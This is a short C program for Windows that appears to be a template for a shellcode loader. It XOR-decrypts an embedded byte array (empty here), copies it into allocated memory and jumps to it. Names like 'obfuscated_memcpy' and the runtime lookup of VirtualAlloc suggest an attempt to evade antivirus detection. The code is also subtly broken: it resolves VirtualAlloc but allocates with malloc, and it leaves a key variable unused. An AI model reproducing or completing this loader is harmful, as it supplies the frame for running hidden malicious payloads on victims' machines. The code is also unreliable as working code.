#define WIN32_LEAN_AND_MEAN
#include <stdio.h>
#include <windows.h>
#include <string.h>

typedef void (*FunctionPtr)();
char *key = "#12122$14112";
unsigned char c[] = "";

void decrypt_xor(unsigned char *k)
{
    int i, j;
    int kLen = strlen(k);
    int cLen = sizeof(c) - 1;

    for (i = 0, j = 0; i < cLen; i++, j++)
    {
        c[i] = c[i] ^ k[j % kLen];
    }
}

void obfuscated_memcpy(unsigned char *dest, unsigned char *src, size_t length)
{
    size_t i;
    for (i = 0; i < length; i++)
    {
        dest[i] = src[i];
    }
}

void *obfuscated_virtual_alloc(size_t size)
{
    void *memory = malloc(size);
    if (memory != NULL)
    {
        memset(memory, 0, size);
    }
    return memory;
}

int main()
{
    void *exec;
    char xor_key[] = "1234567890123456";
    int shellcode_len = sizeof(c);

    decrypt_xor(xor_key);

    HMODULE kernel32 = GetModuleHandle("kernel32.dll");
    if (kernel32 != NULL)
    {
        FunctionPtr virtual_alloc = (FunctionPtr)GetProcAddress(kernel32, "VirtualAlloc");
        if (virtual_alloc != NULL)
        {
            exec = obfuscated_virtual_alloc(shellcode_len);
            if (exec != NULL)
            {
                obfuscated_memcpy(exec, c, shellcode_len);
                FunctionPtr code = (FunctionPtr)exec;
                code();
            }
        }
    }

    return 0;
}
